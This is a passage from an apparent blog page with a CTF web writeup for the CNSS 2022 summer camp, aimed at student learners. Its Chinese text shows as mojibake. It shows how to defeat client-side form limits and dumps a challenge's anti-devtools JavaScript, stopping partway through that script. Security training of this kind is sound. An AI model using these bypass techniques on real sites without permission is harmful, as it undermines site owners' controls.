<!DOCTYPE html>
<html lang="zh-CN">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>CNSS2022å¤ä»¤è¥_WEB_Writeup - xxxl&#39;s Blog</title><meta name="Description" content="æ‘˜è¦ï¼šå¤šæ¥ç‚¹æ–°ç”Ÿå¤§è·Œæ–¯å“ˆæ–¯å“ˆğŸ¤¤"><meta property="og:title" content="CNSS2022å¤ä»¤è¥_WEB_Writeup" />
<meta property="og:description" content="æ‘˜è¦ï¼šå¤šæ¥ç‚¹æ–°ç”Ÿå¤§è·Œæ–¯å“ˆæ–¯å“ˆğŸ¤¤" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://4ever-xxxl.github.io/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/" /><meta property="og:image" content="https://4ever-xxxl.github.io/47"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-08-28T10:46:44+08:00" />
<meta property="article:modified_time" content="2022-08-28T10:46:44+08:00" /><meta property="og:site_name" content="xxxl&#39;s Blog" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://4ever-xxxl.github.io/47"/>

<meta name="twitter:title" content="CNSS2022å¤ä»¤è¥_WEB_Writeup"/>
<meta name="twitter:description" content="æ‘˜è¦ï¼šå¤šæ¥ç‚¹æ–°ç”Ÿå¤§è·Œæ–¯å“ˆæ–¯å“ˆğŸ¤¤"/>
<meta name="application-name" content="LoveIt">
<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/image/favicon.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://4ever-xxxl.github.io/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/" /><link rel="prev" href="https://4ever-xxxl.github.io/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/" /><link rel="next" href="https://4ever-xxxl.github.io/%E5%9B%9B%E5%B7%9D%E7%9C%81%E7%BD%91%E5%AE%89%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B2022-%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "CNSS2022å¤ä»¤è¥_WEB_Writeup",
        "inLanguage": "zh-CN",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/4ever-xxxl.github.io\/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup\/"
        },"image": ["https:\/\/4ever-xxxl.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "CTF, WEB, Writeup","wordcount":  6733 ,
        "url": "https:\/\/4ever-xxxl.github.io\/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup\/","datePublished": "2022-08-28T10:46:44+08:00","dateModified": "2022-08-28T10:46:44+08:00","publisher": {
            "@type": "Organization",
            "name": "m1ca","logo": "https:\/\/4ever-xxxl.github.io\/images\/avatar.png"},"author": {
                "@type": "Person",
                "name": "m1ca"
            },"description": "æ‘˜è¦ï¼šå¤šæ¥ç‚¹æ–°ç”Ÿå¤§è·Œæ–¯å“ˆæ–¯å“ˆğŸ¤¤"
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="xxxl&#39;s Blog"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="/image/favicon.png"
        data-srcset="/image/favicon.png, /image/favicon.png 1.5x, /image/favicon.png 2x"
        data-sizes="auto"
        alt="/image/favicon.png"
        title="/image/favicon.png" />xxl</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/" title="About"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="åˆ‡æ¢ä¸»é¢˜">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="xxxl&#39;s Blog"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="/image/favicon.png"
        data-srcset="/image/favicon.png, /image/favicon.png 1.5x, /image/favicon.png 2x"
        data-sizes="auto"
        alt="/image/favicon.png"
        title="/image/favicon.png" />xxl</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="About">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="åˆ‡æ¢ä¸»é¢˜">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">ç›®å½•</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">CNSS2022å¤ä»¤è¥_WEB_Writeup</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/4ever-xxxl" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>m1ca</a></span>&nbsp;<span class="post-category">æ”¶å½•äº <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>CTF</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-08-28">2022-08-28</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;çº¦ 6733 å­—&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;é¢„è®¡é˜…è¯» 14 åˆ†é’Ÿ&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>ç›®å½•</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#-æ›´ç®€å•çš„è®¡ç®—é¢˜">ğŸ”¢ æ›´ç®€å•çš„è®¡ç®—é¢˜</a></li>
    <li><a href="#-d3buger">âš™ï¸ D3buger</a></li>
    <li><a href="#-signin">ğŸš© Signin</a></li>
    <li><a href="#-æ›´å‘çš„è®¡ç®—é¢˜">ğŸ”¢ æ›´å‘çš„è®¡ç®—é¢˜</a></li>
    <li><a href="#-china-flag">ğŸ‡¨ğŸ‡³ China Flag</a></li>
    <li><a href="#-trick">ğŸ¤¥ Trick</a></li>
    <li><a href="#-black-page">â¬› Black Page</a></li>
    <li><a href="#-å¤ªææŒé—¨äºº">â˜¯ï¸ å¤ªææŒé—¨äºº</a></li>
    <li><a href="#-to_be_admin">ğŸ¥³ To_be_Admin</a></li>
    <li><a href="#-ç¬¬ä¸€æ¬¡è·‘è·¯">ğŸƒ ç¬¬ä¸€æ¬¡è·‘è·¯</a></li>
    <li><a href="#-to_be_admin_again">ğŸ¤ To_be_Admin_Again</a></li>
    <li><a href="#-to_be_admin_again_and_again">ğŸ˜° To_be_Admin_Again_and_Again</a></li>
    <li><a href="#to_be_admin_again_and_again_and_again">ğŸ¤¯To_be_Admin_Again_and_Again_and_Again</a></li>
    <li><a href="#-inject-me">ğŸ’‰ Inject me</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><!-- # CNSSå¤ä»¤è¥_WEB_Writeup -->
<blockquote>
<p>æœ¬ç¯‡ Writeup ä¸»è¦æ˜¯ç”¨äºå†™ç»™æ–°ç”Ÿå¤ç°å­¦ä¹ çš„ï¼Œé¶æœºä¼šå¼€æ”¾åˆ°ä¸­ç§‹åº”è¯¥
æ½œåŠ›æ–°ç”Ÿå¤šæ¥ç‚¹å“©ï¼Œæ–¯å“ˆæ–¯å“ˆğŸ¤¤</p>
</blockquote>
<h2 id="-æ›´ç®€å•çš„è®¡ç®—é¢˜">ğŸ”¢ æ›´ç®€å•çš„è®¡ç®—é¢˜</h2>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="./img/math1.jpeg"
        data-srcset="./img/math1.jpeg, ./img/math1.jpeg 1.5x, ./img/math1.jpeg 2x"
        data-sizes="auto"
        alt="./img/math1.jpeg"
        title="math1" /></p>
<p>æ‰“å¼€ç½‘ç«™å‘ç°åšäº†å‰ç«¯é™åˆ¶ï¼Œé™åˆ¶äº†é•¿åº¦ä¸º 5ï¼ŒåŒæ—¶ç¦ç”¨äº†æäº¤æŒ‰é’®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;re&#34;</span> <span class="na">maxlength</span><span class="o">=</span><span class="s">&#34;5&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;æäº¤&#34;</span> <span class="na">disabled</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¿®æ”¹åæäº¤å³å¯</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;re&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;æäº¤&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="-d3buger">âš™ï¸ D3buger</h2>
<p>ä¸€ä¸ªä¿„ç½—æ–¯æ–¹å—çš„å°æ¸¸æˆï¼Œç”¨ js è„šæœ¬ç¦ç”¨äº† F12ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å…ˆæ‰“å¼€ F12ï¼Œå†è¿›å…¥é¡µé¢ï¼Œæˆ–è€…ç›´æ¥ Ctrl+S å°±å¯å¾—åˆ°ä»¥ä¸‹æºç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">//å±è”½å³é”®èœå•
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nb">document</span><span class="p">.</span><span class="nx">oncontextmenu</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">event</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">event</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">the</span> <span class="o">=</span> <span class="nx">event</span><span class="p">.</span><span class="nx">srcElement</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">((</span><span class="nx">the</span><span class="p">.</span><span class="nx">tagName</span> <span class="o">==</span> <span class="s2">&#34;INPUT&#34;</span> <span class="o">&amp;&amp;</span> <span class="nx">the</span><span class="p">.</span><span class="nx">type</span><span class="p">.</span><span class="nx">toLowerCase</span><span class="p">()</span> <span class="o">==</span> <span class="s2">&#34;text&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">the</span><span class="p">.</span><span class="nx">tagName</span> <span class="o">==</span> <span class="s2">&#34;TEXTAREA&#34;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">//å±è”½ç²˜è´´
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nb">document</span><span class="p">.</span><span class="nx">onpaste</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">event</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">event</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">the</span> <span class="o">=</span> <span class="nx">event</span><span class="p">.</span><span class="nx">srcElement</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">((</span><span class="nx">the</span><span class="p">.</span><span class="nx">tagName</span> <span class="o">==</span> <span class="s2">&#34;INPUT&#34;</span> <span class="o">&amp;&amp;</span> <span class="nx">the</span><span class="p">.</span><span class="nx">type</span><span class="p">.</span><span class="nx">toLowerCase</span><span class="p">()</span> <span class="o">==</span> <span class="s2">&#34;text&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">the</span><span class="p">.</span><span class="nx">tagName</span> <span class="o">==</span> <span class="s2">&#34;TEXTAREA&#34;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">//å±è”½å¤åˆ¶
</span></span></span><span class="line"><span class="cl"><span class="c1">//å±è”½å‰ªåˆ‡
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nb">document</span><span class="p">.</span><span class="nx">oncut</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">event</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">event</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">the</span> <span class="o">=</span> <span class="nx">event</span><span class="p">.</span><span class="nx">srcElement</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">((</span><span class="nx">the</span><span class="p">.</span><span class="nx">tagName</span> <span class="o">==</span> <span class="s2">&#34;INPUT&#34;</span> <span class="o">&amp;&amp;</span> <span class="nx">the</span><span class="p">.</span><span class="nx">type</span><span class="p">.</span><span class="nx">toLowerCase</span><span class="p">()</span> <span class="o">==</span> <span class="s2">&#34;text&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">the</span><span class="p">.</span><span class="nx">tagName</span> <span class="o">==</span> <span class="s2">&#34;TEXTAREA&#34;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">//ç¦æ­¢f12
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nx">fuckyou</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">window</span><span class="p">.</span><span class="nx">opener</span><span class="o">=</span><span class="kc">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;_self&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nb">window</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span> <span class="c1">//å…³é—­å½“å‰çª—å£(é˜²æŠ½)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">&#34;about:blank&#34;</span><span class="p">;</span> <span class="c1">//å°†å½“å‰çª—å£è·³è½¬ç½®ç©ºç™½é¡µ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">ck</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">profile</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">profileEnd</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//æˆ‘ä»¬åˆ¤æ–­ä¸€ä¸‹profilesé‡Œé¢æœ‰æ²¡æœ‰ä¸œè¥¿ï¼Œå¦‚æœæœ‰ï¼Œè‚¯å®šæœ‰äººæŒ‰F12äº†ï¼Œæ²¡é”™ï¼ï¼
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">console</span><span class="p">.</span><span class="nx">clear</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">clear</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">console</span><span class="p">.</span><span class="nx">profiles</span> <span class="o">==</span> <span class="s2">&#34;object&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">console</span><span class="p">.</span><span class="nx">profiles</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">hehe</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">((</span><span class="nb">window</span><span class="p">.</span><span class="nx">console</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">console</span><span class="p">.</span><span class="nx">firebug</span> <span class="o">||</span> <span class="nx">console</span><span class="p">.</span><span class="nx">table</span> <span class="o">&amp;&amp;</span> <span class="sr">/firebug/i</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">console</span><span class="p">.</span><span class="nx">table</span><span class="p">())))</span> <span class="o">||</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">opera</span> <span class="o">==</span> <span class="s1">&#39;object&#39;</span> <span class="o">&amp;&amp;</span> <span class="k">typeof</span> <span class="nx">opera</span><span class="p">.</span><span class="nx">postError</span> <span class="o">==</span> <span class="s1">&#39;function&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">console</span><span class="p">.</span><span class="nx">profile</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">fuckyou</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">console</span><span class="p">.</span><span class="nx">profiles</span> <span class="o">==</span> <span class="s2">&#34;object&#34;</span> <span class="o">&amp;&amp;</span> <span class="nx">console</span><span class="p">.</span><span class="nx">profiles</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">fuckyou</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nx">hehe</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nb">window</span><span class="p">.</span><span class="nx">onresize</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">outerWidth</span> <span class="o">-</span> <span class="nb">window</span><span class="p">.</span><span class="nx">innerWidth</span> <span class="o">&gt;</span> <span class="mi">20</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">    <span class="nb">window</span><span class="p">.</span><span class="nx">outerHeight</span> <span class="o">-</span> <span class="nb">window</span><span class="p">.</span><span class="nx">innerHeight</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//åˆ¤æ–­å½“å‰çª—å£å†…é¡µé«˜åº¦å’Œçª—å£é«˜åº¦ï¼Œå˜¿å˜¿
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">fuckyou</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nb">document</span><span class="p">.</span><span class="nx">onkeydown</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">((</span><span class="nx">event</span><span class="p">.</span><span class="nx">keyCode</span> <span class="o">==</span> <span class="mi">112</span><span class="p">)</span> <span class="o">||</span> <span class="c1">//å±è”½ F1
